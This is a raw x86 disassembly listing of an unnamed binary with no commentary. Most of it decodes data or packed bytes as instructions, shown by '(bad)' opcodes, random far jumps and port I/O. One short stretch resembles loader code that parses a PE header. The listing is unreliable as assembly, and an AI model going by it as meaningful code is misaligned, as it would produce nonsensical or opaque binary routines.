  40f985:	push   ecx
  40f986:	ficomp WORD PTR [esi]
  40f988:	push   ds
  40f989:	mov    dh,0x2e
  40f98b:	fsub   QWORD PTR [edi-0x17]
  40f98e:	xor    ah,BYTE PTR [edx]
  40f990:	jne    0x40f9c8
  40f992:	jae    0x40f981
  40f994:	rcl    DWORD PTR [ecx-0x5bc28d20],1
  40f99a:	scas   eax,DWORD PTR es:[edi]
  40f99b:	ret    
  40f99c:	mov    esp,0xaee1a8ce
  40f9a1:	push   esi
  40f9a2:	fst    QWORD PTR [eax+0x60]
  40f9a5:	sahf   
  40f9a6:	(bad)  
  40f9a7:	and    esi,DWORD PTR [ebx]
  40f9a9:	das    
  40f9aa:	sub    esi,ecx
  40f9ac:	mov    al,ds:0x24814292
  40f9b1:	and    bl,BYTE PTR [edi]
  40f9b3:	scas   al,BYTE PTR es:[edi]
  40f9b4:	pusha  
  40f9b5:	xchg   ecx,eax
  40f9b6:	mov    al,ds:0xae50966a
  40f9bb:	mov    cl,0xbc
  40f9bd:	push   0x3cc7fc4d
  40f9c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f9c3:	push   eax
  40f9c4:	xor    BYTE PTR [esp+eiz*8],0x67
  40f9c8:	adc    ecx,esp
  40f9ca:	cmp    DWORD PTR [edi-0x79],edx
  40f9cd:	imul   eax,edi,0xffffffc0
  40f9d0:	aaa    
  40f9d1:	mov    ebx,0x60a78b8c
  40f9d6:	push   ss
  40f9d7:	jg     0x40fa17
  40f9d9:	(bad)  
  40f9da:	push   ss
  40f9db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f9dc:	mov    ecx,0x52fd230c
  40f9e1:	mov    edx,0xf45d4ac5
  40f9e6:	nop
  40f9e7:	push   ebp
  40f9e8:	sahf   
  40f9e9:	jno    0x40fa1f
  40f9eb:	inc    edx
  40f9ec:	inc    ebx
  40f9ed:	pusha  
  40f9ee:	mov    bl,0x5f
  40f9f0:	or     DWORD PTR [edx+edi*4-0x5180f73],edi
  40f9f7:	mov    edi,edx
  40f9f9:	add    eax,DWORD PTR [edx-0x2ce682e4]
  40f9ff:	inc    ebp
  40fa00:	loopne 0x40f9c9
  40fa02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa03:	mov    cl,BYTE PTR [esi]
  40fa05:	mov    ah,0x25
  40fa07:	inc    edi
  40fa08:	fdivrp st(3),st
  40fa0a:	jecxz  0x40fa8a
  40fa0c:	nop
  40fa0d:	sbb    al,0xb5
  40fa0f:	sub    eax,0xdc2d8c54
  40fa14:	add    eax,0x4f7fd92f
  40fa19:	cwde   
  40fa1a:	stc    
  40fa1b:	jmp    0x40fa1d
  40fa1d:	mov    eax,ds:0x6156a354
  40fa22:	jo     0x40fa7b
  40fa24:	sub    eax,0x6ad6f595
  40fa29:	call   0x871f:0x45ed4ba8
  40fa30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa31:	out    0xcf,eax
  40fa33:	and    esp,DWORD PTR [ebx+0x56255acd]
  40fa39:	xor    cl,BYTE PTR [edx]
  40fa3b:	jo     0x40f9f6
  40fa3d:	mov    edi,0x6efc08c9
  40fa42:	add    eax,0x45ef190f
  40fa47:	inc    edi
  40fa48:	mov    edx,0xfde38dc5
  40fa4d:	aam    0x7c
  40fa4f:	push   0xffffffb7
  40fa51:	cmovle ecx,ebp
  40fa54:	bound  eax,QWORD PTR [ebx]
  40fa56:	xchg   ecx,eax
  40fa57:	pushf  
  40fa58:	xor    al,0xc
  40fa5a:	adc    eax,0x2afb2f7d
  40fa5f:	cmp    ebx,esp
  40fa61:	mov    bh,0xb8
  40fa63:	sub    bl,BYTE PTR [ebp-0x78c5e0ea]
  40fa69:	jge    0x40fa18
  40fa6b:	addr16 pop ecx
  40fa6d:	pop    ss
  40fa6e:	adc    bh,dl
  40fa70:	dec    ecx
  40fa71:	es inc ebp
  40fa73:	inc    eax
  40fa74:	call   0x9069cba
  40fa79:	shl    DWORD PTR [ebp+0x78],1
  40fa7c:	pop    esi
  40fa7d:	mov    ebx,0xc40b3128
  40fa82:	sub    eax,0x19e1d1cd
  40fa87:	(bad)  
  40fa88:	push   edx
  40fa89:	push   ss
  40fa8a:	int3   
  40fa8b:	nop
  40fa8c:	mov    WORD PTR [ecx],gs
  40fa8e:	pop    ds
  40fa8f:	or     eax,0x4e6c11e8
  40fa94:	sbb    al,BYTE PTR [ecx]
  40fa96:	xor    bl,BYTE PTR [edi-0x6b]
  40fa99:	lods   al,BYTE PTR ds:[esi]
  40fa9a:	mov    ds:0xfbce2200,eax
  40fa9f:	imul   ebp,DWORD PTR [ebp-0x3d],0xffffffe2
  40faa3:	(bad)  
  40faa4:	or     eax,0xbebaae0
  40faa9:	mov    ebx,0xf8b423d7
  40faae:	std    
  40faaf:	dec    ecx
  40fab0:	pop    ss
  40fab1:	mov    ebp,0x2dc8d8de
  40fab6:	js     0x40fae1
  40fab8:	mov    ebx,0x39374614
  40fabd:	lods   al,BYTE PTR ds:[esi]
  40fabe:	out    dx,al
  40fabf:	pusha  
  40fac0:	ret    0x539
  40fac3:	xor    edx,esp
  40fac5:	xchg   ecx,eax
  40fac6:	out    0x34,eax
  40fac8:	leave  
  40fac9:	out    dx,al
  40faca:	daa    
  40facb:	mov    ebp,0x677cec6e
  40fad0:	inc    esp
  40fad1:	mov    DWORD PTR [esi],0x3813342a
  40fad7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fad8:	aam    0xb8
  40fada:	pushf  
  40fadb:	mov    dl,0x49
  40fadd:	sub    DWORD PTR [ecx],esi
  40fadf:	add    ebx,DWORD PTR [eax+0x7d259ecc]
  40fae5:	fisubr DWORD PTR [ebx]
  40fae7:	add    esp,DWORD PTR [ecx+edx*8+0x1e36eae4]
  40faee:	inc    DWORD PTR [ecx+esi*2+0x67]
  40faf2:	jl     0x40fa78
  40faf4:	jl     0x40fb68
  40faf6:	inc    ebx
  40faf7:	add    esi,DWORD PTR [ecx+0x4a40ced7]
  40fafd:	int    0xa5
  40faff:	sbb    eax,0xbc017e57
  40fb04:	pop    esi
  40fb05:	jmp    0xc99f:0xc435924e
  40fb0c:	ds push esp
  40fb0e:	mov    cl,0x79
  40fb10:	ja     0x40fb3d
  40fb12:	jnp    0x40fb39
  40fb14:	inc    esp
  40fb15:	lahf   
  40fb16:	sub    dl,bh
  40fb18:	pop    eax
  40fb19:	jne    0x40fb65
  40fb1b:	or     al,0x55
  40fb1d:	aam    0x1d
  40fb1f:	add    edi,DWORD PTR [ecx+0x6c]
  40fb22:	and    DWORD PTR [eax],0x4c5ac0ec
  40fb28:	jne    0x40fb00
  40fb2a:	lahf   
  40fb2b:	addr16 repnz and edi,ebp
  40fb2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb30:	mov    ecx,0xd4259447
  40fb35:	mov    ds:0x5c1bcada,al
  40fb3a:	or     al,0xf6
  40fb3c:	popf   
  40fb3d:	add    eax,0xa2c1347c
  40fb42:	xor    al,0x1e
  40fb44:	xor    eax,0x7166761a
  40fb49:	pop    edi
  40fb4a:	jne    0x40fb35
  40fb4c:	sub    bh,BYTE PTR [esi+0x43]
  40fb4f:	pop    eax
  40fb50:	fldl2t 
  40fb52:	push   cs
  40fb53:	rol    DWORD PTR [edx],1
  40fb55:	xor    ecx,DWORD PTR [ebp+0x1e]
  40fb58:	out    dx,eax
  40fb59:	mov    cx,?
  40fb5c:	dec    esp
  40fb5d:	inc    esp
  40fb5e:	sbb    BYTE PTR [edi],cl
  40fb60:	add    BYTE PTR [edi+0x627d3235],bh
  40fb66:	and    cl,BYTE PTR [edi-0x46]
  40fb69:	fadd   st(4),st
  40fb6b:	sbb    BYTE PTR [ebp*1+0x6e7abeb6],ch
  40fb72:	xlat   BYTE PTR ds:[ebx]
  40fb73:	out    0x1d,eax
  40fb75:	cmc    
  40fb76:	lods   eax,DWORD PTR ds:[esi]
  40fb77:	sbb    al,0xe5
  40fb79:	xor    eax,0x261a8d86
  40fb7e:	cmp    eax,0x13801163
  40fb83:	pop    ecx
  40fb84:	shl    DWORD PTR [ecx-0x6f],cl
  40fb87:	jne    0x40fb49
  40fb89:	sbb    dh,dl
  40fb8b:	or     ecx,edx
  40fb8d:	sar    BYTE PTR [edx+0x4b],1
  40fb90:	adc    eax,0x14354f8
  40fb95:	mov    edx,DWORD PTR [ecx-0x38]
  40fb98:	js     0x40fbe5
  40fb9a:	push   ecx
  40fb9b:	neg    DWORD PTR ds:0x42e1a4
  40fba1:	jmp    0x40ff6b
  40fba6:	mov    ebp,ecx
  40fba8:	cli    
  40fba9:	xor    DWORD PTR [edx-0x648a4e8f],edi
  40fbaf:	test   BYTE PTR [ebp-0x51],0xf
  40fbb3:	mov    ah,0x9d
  40fbb5:	jns    0x40fb39
  40fbb7:	mov    cl,0x70
  40fbb9:	jo     0x40fb5e
  40fbbb:	jge    0x40fc2d
  40fbbd:	jo     0x40fbb9
  40fbbf:	sub    al,0xfd
  40fbc1:	add    esp,DWORD PTR [edx-0x46]
  40fbc4:	push   ebx
  40fbc5:	or     edx,DWORD PTR [ebx+ecx*1]
  40fbc8:	mov    al,ds:0x3283f5c9
  40fbcd:	sahf   
  40fbce:	xor    ecx,DWORD PTR [esi+0x67]
  40fbd1:	and    DWORD PTR ds:0x74c49928,0xffffffb4
  40fbd8:	cld    
  40fbd9:	mov    edx,0x4aee842e
  40fbde:	dec    BYTE PTR [ecx-0x25]
  40fbe1:	adc    DWORD PTR [eax-0x38],esp
  40fbe4:	adc    al,dh
  40fbe6:	dec    eax
  40fbe7:	not    BYTE PTR [ebx+ecx*1+0x3c]
  40fbeb:	call   0x99b3:0x3abee385
  40fbf2:	push   eax
  40fbf3:	mov    bh,0xbd
  40fbf5:	enter  0xa701,0xad
  40fbf9:	push   0xf8bb2c7a
  40fbfe:	push   ds
  40fbff:	mov    esi,0x113acdb7
  40fc04:	jmp    0x20e6:0x9f61a675
  40fc0b:	rcr    BYTE PTR [ebx-0x45a80de0],cl
  40fc11:	shl    DWORD PTR [ecx+0x235330f3],1
  40fc17:	adc    DWORD PTR [edx+0x3f6dfdb4],esp
  40fc1d:	and    eax,0x54b695df
  40fc22:	mov    esp,0x92b93114
  40fc27:	inc    esp
  40fc28:	jae    0x40fc4a
  40fc2a:	out    dx,eax
  40fc2b:	add    edx,DWORD PTR [ecx-0x7]
  40fc2e:	dec    ebp
  40fc2f:	(bad)
  40fc32:	mov    ebx,0x4622cf43
  40fc37:	adc    al,0xf
  40fc39:	mov    ebp,0x994dd6c4
  40fc3e:	iret   
  40fc3f:	popf   
  40fc40:	aam    0x2
  40fc42:	cwde   
  40fc43:	out    0x74,eax
  40fc45:	in     eax,0x61
  40fc47:	loop   0x40fc63
  40fc49:	mov    eax,ds:0x97c0b066
  40fc4e:	pop    ss
  40fc4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc50:	ss cdq 
  40fc52:	push   ebp
  40fc53:	shl    DWORD PTR [ebp-0x7344655d],cl
  40fc59:	push   esp
  40fc5a:	test   eax,0x3e56ea67
  40fc5f:	dec    edi
  40fc60:	in     eax,0x94
  40fc62:	fist   WORD PTR [edi]
  40fc64:	psrlq  mm2,QWORD PTR [esi]
  40fc67:	inc    edx
  40fc68:	mov    al,ds:0x125e2f13
  40fc6d:	sbb    BYTE PTR [eax+0x41a0bab5],bl
  40fc73:	aad    0x91
  40fc75:	pusha  
  40fc76:	sbb    al,BYTE PTR [esp+0x22]
  40fc7a:	mov    WORD PTR [ebx+0x55],ss
  40fc7d:	gs push eax
  40fc7f:	fst    QWORD PTR [edi-0x5d]
  40fc82:	pop    esi
  40fc83:	nop
  40fc84:	clc    
  40fc85:	adc    eax,0x59b3f4b2
  40fc8a:	xchg   esi,eax
  40fc8b:	add    DWORD PTR [ebp-0x27f31890],eax
  40fc91:	or     esi,DWORD PTR [eax-0xbd75570]
  40fc97:	call   0xf6f0c249
  40fc9c:	add    ecx,edx
  40fc9e:	sahf   
  40fc9f:	adc    dl,BYTE PTR [esi+0xa8974f5]
  40fca5:	jns    0x40fc38
  40fca7:	sub    DWORD PTR [edi],edx
  40fca9:	stc    
  40fcaa:	or     DWORD PTR [ebx],eax
  40fcac:	cmp    eax,0x94a0a713
  40fcb1:	pop    ebx
  40fcb2:	pop    ds
  40fcb3:	neg    DWORD PTR [ebx+0x1cc8f4bd]
  40fcb9:	ss cmp eax,0x82a347d2
  40fcbf:	hlt    
  40fcc0:	fnstcw WORD PTR [esi]
  40fcc2:	pushf  
  40fcc3:	cmp    edi,DWORD PTR [edi]
  40fcc5:	aas    
  40fcc6:	push   ecx
  40fcc7:	retf   0x286d
  40fcca:	inc    esi
  40fccb:	sbb    ch,bh
  40fccd:	sub    DWORD PTR [eax-0x2f],0xffffffdb
  40fcd1:	jne    0x40fc9c
  40fcd3:	aad    0xb3
  40fcd5:	xchg   edx,ebp
  40fcd7:	rol    DWORD PTR [ebp+0x40],0xc
  40fcdb:	jg     0x40fc9a
  40fcdd:	mov    ds:0x84be2368,eax
  40fce2:	test   al,0x47
  40fce4:	iret   
  40fce5:	push   eax
  40fce6:	inc    edx
  40fce7:	jno    0x40fcff
  40fce9:	xchg   edi,eax
  40fcea:	rcl    BYTE PTR [esi-0x1e],cl
  40fced:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fcee:	mov    bh,0xda
  40fcf0:	call   FWORD PTR [ecx+0x5e66b00]
  40fcf6:	inc    ecx
  40fcf7:	loop   0x40fcbb
  40fcf9:	mov    dh,0x29
  40fcfb:	(bad)  
  40fcfc:	sbb    ch,BYTE PTR [edi]
  40fcfe:	mov    al,0x87
  40fd00:	and    DWORD PTR [ecx-0x22f8c37f],ebp
  40fd06:	ja     0x40fd1f
  40fd08:	ins    BYTE PTR es:[edi],dx
  40fd09:	hlt    
  40fd0a:	retf   
  40fd0b:	sbb    al,0x4d
  40fd0d:	xchg   ecx,eax
  40fd0e:	xor    esi,DWORD PTR [eax+0x5c186f7a]
  40fd14:	hlt    
  40fd15:	das    
  40fd16:	in     eax,dx
  40fd17:	or     al,0x5e
  40fd19:	mov    bh,0xb6
  40fd1b:	inc    esp
  40fd1c:	adc    al,bl
  40fd1e:	sub    edx,ebx
  40fd20:	pop    ebp
  40fd21:	aas    
  40fd22:	test   eax,0x6247983e
  40fd27:	fmul   QWORD PTR [esi+0x52dad1af]
  40fd2d:	sub    dh,dl
  40fd2f:	add    ebp,eax
  40fd31:	fwait
  40fd32:	mov    edx,0xf15647c9
  40fd37:	(bad)  
  40fd38:	mov    bp,0xc250
  40fd3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd3d:	(bad)  [edx+ecx*2]
  40fd40:	sbb    edx,DWORD PTR ds:0x726e3a75
  40fd46:	sldt   WORD PTR [eax+0x3a]
  40fd4a:	mov    al,0x13
  40fd4c:	pusha  
  40fd4d:	imul   esp,DWORD PTR [ebp-0x1fa92539],0xf
  40fd54:	adc    bl,bl
  40fd56:	sbb    BYTE PTR [ebp+0x52],ah
  40fd59:	call   0xfd30:0xfb43ae73
  40fd60:	push   ebp
  40fd61:	pop    esp
  40fd62:	icebp  
  40fd63:	out    0x8c,eax
  40fd65:	sbb    DWORD PTR [ebp+0x2b],edx
  40fd68:	out    dx,eax
  40fd69:	adc    eax,DWORD PTR [eax]
  40fd6b:	pop    ds
  40fd6c:	jo     0x40fd04
  40fd6e:	and    DWORD PTR [esi],0x14
  40fd71:	cwde   
  40fd72:	adc    DWORD PTR [eax],ebp
  40fd74:	adc    edi,edi
  40fd76:	inc    edi
  40fd77:	icebp  
  40fd78:	(bad)  
  40fd7a:	push   esi
  40fd7b:	push   cs
  40fd7c:	push   esi
  40fd7d:	shl    DWORD PTR fs:[ebp+0x18],1
  40fd81:	test   al,0x8a
  40fd83:	pop    es
  40fd84:	cdq    
  40fd85:	and    al,0xb2
  40fd87:	arpl   WORD PTR [ebx+0x49],dx
  40fd8a:	fcom   st(0)
  40fd8c:	jmp    0x95ae:0xe033f27c
  40fd93:	add    ah,bh
  40fd95:	leave  
  40fd96:	shl    BYTE PTR [ebp-0x46db37d9],0xd0
  40fd9d:	xor    edi,eax
  40fd9f:	and    DWORD PTR gs:[edi-0x4f23258b],ecx
  40fda6:	xchg   BYTE PTR [ebx+ebp*1-0x22daf093],al
  40fdad:	mov    bh,0x91
  40fdaf:	mov    ah,0x83
  40fdb1:	and    BYTE PTR [esi],al
  40fdb3:	xchg   esi,eax
  40fdb4:	mov    eax,0x3457bdd5
  40fdb9:	mov    ds:0x8206827c,al
  40fdbe:	push   0x931fb153
  40fdc3:	mov    edi,0xe5cd5ecb
  40fdc8:	(bad)  
  40fdc9:	loopne 0x40fe32
  40fdcb:	jbe    0x40fd7f
  40fdcd:	mov    dh,0x24
  40fdcf:	iret   
  40fdd0:	fstp   TBYTE PTR [edi+0x65ef3a0c]
  40fdd6:	inc    edi
  40fdd7:	jnp    0x40fda0
  40fdd9:	fld    QWORD PTR [esi+0x226da7a4]
  40fddf:	mov    edi,0x669f0afa
  40fde4:	push   edi
  40fde5:	mov    eax,DWORD PTR [esi-0x3b]
  40fde8:	popf   
  40fde9:	enter  0xddc1,0xdd
  40fded:	inc    ebx
  40fdee:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fdf0:	test   BYTE PTR [edi],ch
  40fdf2:	(bad)  
  40fdf3:	test   al,0x62
  40fdf5:	jmp    0x72964638
  40fdfa:	addr16 dec edx
  40fdfc:	xor    esp,DWORD PTR [esi+ebx*4-0x52cffdc]
  40fe03:	jecxz  0x40fdfc
  40fe05:	scas   eax,DWORD PTR es:[edi]
  40fe06:	adc    al,0x20
  40fe08:	rcr    DWORD PTR [ebx],0x27
  40fe0b:	cld    
  40fe0c:	lods   al,BYTE PTR ds:[esi]
  40fe0d:	js     0x40fe3e
  40fe0f:	push   edi
  40fe10:	pop    esp
  40fe11:	adc    esp,edi
  40fe13:	fadd   st(6),st
  40fe15:	dec    ebx
  40fe16:	xor    eax,DWORD PTR [eax-0x6bb2a051]
  40fe1c:	push   ds
  40fe1d:	je     0x40fe3b
  40fe1f:	jns    0x40fde7
  40fe21:	xor    eax,0x8cf65896
  40fe26:	(bad)  
  40fe27:	push   edx
  40fe28:	dec    esp
  40fe29:	enter  0x1960,0x59
  40fe2d:	retf   
  40fe2e:	mov    edx,0x25aca872
  40fe33:	(bad)  
  40fe34:	jmp    0x646:0x67f7ed75
  40fe3b:	in     eax,0xf7
  40fe3d:	in     al,dx
  40fe3e:	add    ecx,DWORD PTR [esi+0x48]
  40fe41:	jp     0x40fdd8
  40fe43:	stos   BYTE PTR es:[edi],al
  40fe44:	imul   ebp,DWORD PTR [ecx+0x3a4d2ea3],0xfffffff9
  40fe4b:	popa   
  40fe4c:	cmp    ah,bh
  40fe4e:	cmc    
  40fe4f:	mov    edi,0x9472b00f
  40fe54:	jl     0x40fe89
  40fe56:	into   
  40fe57:	mov    ecx,0x79f6c1a2
  40fe5c:	ins    DWORD PTR es:[edi],dx
  40fe5d:	sbb    eax,0xa872c81
  40fe62:	push   cs
  40fe63:	cmp    ecx,ebx
  40fe65:	sbb    dl,BYTE PTR [ecx]
  40fe67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe68:	mov    edi,0x1a277300
  40fe6d:	out    dx,eax
  40fe6e:	ret    
  40fe6f:	or     bp,WORD PTR [ebx-0x70]
  40fe73:	add    al,0x68
  40fe75:	cwde   
  40fe76:	(bad)  [edi+eax*2-0x3a]
  40fe7a:	mov    WORD PTR [eax-0x6b],fs
  40fe7d:	and    ebx,edx
  40fe7f:	stos   DWORD PTR es:[edi],eax
  40fe80:	(bad)  
  40fe81:	shl    BYTE PTR [ebx-0x7b],1
  40fe84:	addr16 (bad) 
  40fe86:	aam    0x15
  40fe88:	mov    WORD PTR [eax],gs
  40fe8a:	(bad)  
  40fe8b:	mov    al,0x3e
  40fe8d:	pop    edx
  40fe8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe8f:	in     al,dx
  40fe90:	fwait
  40fe91:	push   edi
  40fe92:	push   eax
  40fe93:	retf   0xa31c
  40fe96:	rcl    esi,0xd1
  40fe99:	pop    ss
  40fe9a:	xor    cl,dh
  40fe9c:	push   edi
  40fe9d:	out    0x26,eax
  40fe9f:	mov    ds:0x83d8a0ee,al
  40fea4:	call   0x426:0x7963a737
  40feab:	xor    DWORD PTR [ecx+0x43],0x4e
  40feaf:	rol    BYTE PTR [bp+di-0x68],1
  40feb3:	push   0x4ac93d60
  40feb8:	mov    dl,0x5d
  40feba:	dec    BYTE PTR [esp+eax*4+0x89938a7]
  40fec1:	les    edi,FWORD PTR [ecx]
  40fec3:	pop    es
  40fec4:	push   ebp
  40fec5:	sub    esp,DWORD PTR ds:0xfe0d0e36
  40fecb:	mov    edi,cr7
  40fece:	xchg   ebx,eax
  40fecf:	jg     0x40ff44
  40fed1:	add    ebp,DWORD PTR [esp+ecx*4]
  40fed4:	fmul   st(7),st
  40fed6:	clc    
  40fed7:	or     al,0x45
  40fed9:	mov    ah,0xc5
  40fedb:	jno    0x40fed2
  40fedd:	jl     0x40ff42
  40fedf:	call   0xcd82:0xa731d6da
  40fee6:	imul   eax,DWORD PTR [ebx-0x72],0x2f696bc4
  40feed:	dec    esp
  40feee:	shl    BYTE PTR [edx],1
  40fef0:	(bad)  
  40fef1:	cmp    DWORD PTR ds:0xb5bfdb56,eax
  40fef7:	sbb    esp,esp
  40fef9:	sub    al,BYTE PTR [edi]
  40fefb:	jge    0x40fea7
  40fefd:	jmp    0x40ff5a
  40feff:	cmp    dl,BYTE PTR [ebx]
  40ff01:	mov    esp,0xb5bd9f81
  40ff06:	pop    esi
  40ff07:	xchg   ecx,eax
  40ff08:	add    eax,0xb0246433
  40ff0d:	das    
  40ff0e:	setp   BYTE PTR [ecx-0x198b21c5]
  40ff15:	push   ebp
  40ff16:	js     0x40ff3b
  40ff18:	xchg   esi,eax
  40ff19:	sub    edi,DWORD PTR [edi+0xe11078a]
  40ff1f:	aaa    
  40ff20:	xor    al,0x70
  40ff22:	test   DWORD PTR [edi-0x5c],0xb59d5be1
  40ff29:	aaa    
  40ff2a:	push   edi
  40ff2b:	adc    BYTE PTR [esi],dh
  40ff2d:	fnstsw WORD PTR [ebx]
  40ff2f:	jae    0x40ff42
  40ff31:	lea    ecx,[ebp-0x55]
  40ff34:	and    DWORD PTR [edx-0x18475ba4],ecx
  40ff3a:	push   esp
  40ff3b:	lds    eax,FWORD PTR [eax]
  40ff3d:	pop    ss
  40ff3e:	inc    ecx
  40ff3f:	dec    edi
  40ff40:	and    ebx,ebx
  40ff42:	daa    
  40ff43:	clc    
  40ff44:	mov    ecx,0x1cc61d47
  40ff49:	mov    al,0xd6
  40ff4b:	adc    edx,DWORD PTR [edx+0x2243493]
  40ff51:	es push ss
  40ff53:	test   BYTE PTR [eax-0x35],ah
  40ff56:	sbb    DWORD PTR [edx-0x4ce03460],edi
  40ff5c:	ja     0x40ff44
  40ff5e:	mov    edx,0xa66ef9b
  40ff63:	ins    DWORD PTR es:[edi],dx
  40ff64:	and    DWORD PTR ds:0x265f69ff,ecx
  40ff6a:	push   ds
  40ff6b:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40ff72:	mov    eax,DWORD PTR [ebp+0x8]
  40ff75:	mov    al,BYTE PTR [eax]
  40ff77:	mov    DWORD PTR ds:0x42e1b4,0x3a3a
  40ff81:	add    al,0x37
  40ff83:	xor    DWORD PTR ds:0x42e777,0x42fdfe
  40ff8d:	xor    al,0x47
  40ff8f:	mov    DWORD PTR ds:0x42fd51,0x1793
  40ff99:	cmp    al,0xc3
  40ff9b:	jne    0x410b7f
  40ffa1:	mov    eax,DWORD PTR [ebp+0x8]
  40ffa4:	mov    edx,DWORD PTR ds:0x42fdf6
  40ffaa:	and    edx,DWORD PTR ds:0x42e77b
  40ffb0:	mov    DWORD PTR ds:0x42fdf6,edx
  40ffb6:	mov    ecx,DWORD PTR [ebp+0x8]
  40ffb9:	mov    DWORD PTR ds:0x42e783,0x1299
  40ffc3:	add    ecx,DWORD PTR [eax+0x3c]
  40ffc6:	mov    edx,0x7510855
  40ffcb:	jmp    0x410395
  40ffd0:	fcmovnbe st,st(4)
  40ffd2:	aam    0xc8
  40ffd4:	repz enter 0xf3db,0x5c
  40ffd9:	push   edx
  40ffda:	jae    0x40fff5
  40ffdc:	into   
  40ffdd:	loopne 0x41002c
  40ffdf:	adc    esi,DWORD PTR ds:0xa37070bd
  40ffe5:	jge    0x410057
  40ffe7:	jo     0x410047
  40ffe9:	stos   DWORD PTR es:[edi],eax
  40ffea:	jbe    0x40ffbf
  40ffec:	sub    al,BYTE PTR [ebx]
  40ffee:	mov    bl,0x40
  40fff0:	out    0x6f,al
  40fff2:	push   cs
  40fff3:	sub    BYTE PTR [esi],dl
  40fff5:	ret    0x3fb
  40fff8:	(bad)  
  40fff9:	in     eax,dx
  40fffa:	ds aaa 
  40fffc:	repz inc sp
  40ffff:	es retf 
  410001:	add    eax,0x22fabe5c
  410006:	cmp    dl,BYTE PTR [ecx+0x23025c6e]
  41000c:	mov    cl,0x62
  41000e:	dec    ecx
  41000f:	or     edi,ecx
  410011:	les    ecx,FWORD PTR [edi-0x4c8abb6b]
  410017:	mov    ah,0x5e
  410019:	mov    dh,0x39
  41001b:	rol    BYTE PTR [esi],1
  41001d:	(bad)  
  41001e:	and    esp,DWORD PTR [ecx-0x3cf8e07b]
  410024:	data16 loopne 0x40fff7
  410027:	jmp    0x57c60df2
  41002c:	mov    eax,0x2bd48d08
  410031:	outs   dx,DWORD PTR ds:[esi]
  410032:	mov    ?,WORD PTR [eax+ebx*2+0x1b]
  410036:	and    esp,DWORD PTR ds:0x2e44d7d6
  41003c:	lds    ebx,FWORD PTR [esi+edi*1-0x25]
  410040:	sub    BYTE PTR [esi-0x73840bb6],dl
  410046:	xchg   esi,eax
  410047:	xchg   BYTE PTR [ebx+0x55b5f2ff],bl
  41004d:	lds    esp,FWORD PTR [eax]
  41004f:	fist   WORD PTR [eax+0x55]
  410052:	mov    bh,0x70
  410054:	jne    0x410015
  410056:	mov    DWORD PTR [eax+ebx*8],edi
  410059:	or     DWORD PTR [esi],0x594a16d6
  41005f:	sub    DWORD PTR [ecx-0x28],ebp
  410062:	call   0xe75b:0xde028534
  410069:	fild   DWORD PTR [ecx]
  41006b:	inc    ecx
  41006c:	movaps xmm7,xmm4
  41006f:	mov    edi,0x8d27fee7
  410074:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410075:	enter  0xd090,0xd5
  410079:	mov    ebx,0xc5da8777
  41007e:	ja     0x410029
  410080:	sbb    edi,DWORD PTR [edi]
  410082:	sub    eax,0x8d8992f6
  410087:	push   ecx
  410088:	dec    edx
  410089:	sub    dh,BYTE PTR [ebx-0x2f]
  41008c:	or     BYTE PTR [esi],0x52
  41008f:	stos   DWORD PTR es:[edi],eax
  410090:	cmc    
  410091:	push   esp
  410092:	inc    eax
  410093:	out    0x51,eax
  410095:	ins    BYTE PTR es:[edi],dx
  410096:	int    0xad
  410098:	fadd   QWORD PTR [ecx+0x3dc645e]
  41009e:	pushf  
  41009f:	pop    es
  4100a0:	hlt    
  4100a1:	jbe    0x4100b4
  4100a3:	std    
  4100a4:	fcomp  st(5)
  4100a6:	les    esi,FWORD PTR [edx-0x73fb3b8c]
  4100ac:	jb     0x41004c
  4100ae:	rcr    dl,0xad
  4100b1:	hlt    
  4100b2:	out    dx,al
  4100b3:	sbb    edi,DWORD PTR [edx+0x61]
  4100b6:	sbb    BYTE PTR [ebp-0x5c],ah
  4100b9:	push   ebx
  4100ba:	push   ecx
  4100bb:	xor    BYTE PTR gs:[edx+ebp*2+0x4ead8c2],bl
  4100c3:	mov    dl,BYTE PTR [eax+0x37]
  4100c6:	std    
  4100c7:	jno    0x410059
  4100c9:	jg     0x4100af
  4100cb:	add    DWORD PTR [esp+esi*8-0x38],ebp
  4100cf:	sar    BYTE PTR [edi-0x700db40b],0x59
  4100d6:	enter  0xcbe8,0xa8
  4100da:	in     eax,0xe7
  4100dc:	dec    edi
  4100dd:	pop    ds
  4100de:	bound  edi,QWORD PTR [edx+0x30]
  4100e1:	and    DWORD PTR [ecx],ebp
  4100e3:	cli    
  4100e4:	push   0x45
  4100e6:	xor    BYTE PTR ss:[edx],0x47
  4100ea:	xor    ecx,DWORD PTR [esi+ebx*8+0x13abb29c]
  4100f1:	js     0x410168
  4100f3:	jp     0x4100d2
  4100f5:	adc    DWORD PTR [esi+edx*8+0x696f7cfa],ebp
  4100fc:	xchg   BYTE PTR [edi+0x3cf0ac7b],dl
  410102:	adc    eax,0x9bd5cc7f
  410107:	das    
  410108:	sbb    BYTE PTR fs:[ebx],dl
  41010b:	mov    al,ds:0x82911001
  410110:	fyl2x  
  410112:	and    edx,DWORD PTR [ebp-0x8]
  410115:	popf   
  410116:	hlt    
  410117:	mov    ds:0xdbc620e5,eax
  41011c:	jp     0x410125
  41011e:	out    0x8b,eax
  410120:	add    BYTE PTR [esi+ebp*2],ch
  410123:	pop    ebx
  410124:	and    DWORD PTR [esi+0x76dcd72b],esi
  41012a:	jmp    0x4100e8
  41012c:	xchg   edx,eax
  41012d:	jmp    0xbc22:0xac41d306
  410134:	es sbb eax,0x4beaf3d1
  41013a:	adc    al,0x33
  41013c:	test   al,0x83
  41013e:	pop    es
  41013f:	sub    BYTE PTR [esi+ebx*8],0x20
  410143:	add    esi,ebp
  410145:	fst    QWORD PTR [ebx]
  410147:	mov    ds,WORD PTR [esi-0x1d]
  41014a:	retf   
  41014b:	clc    
  41014c:	pushf  
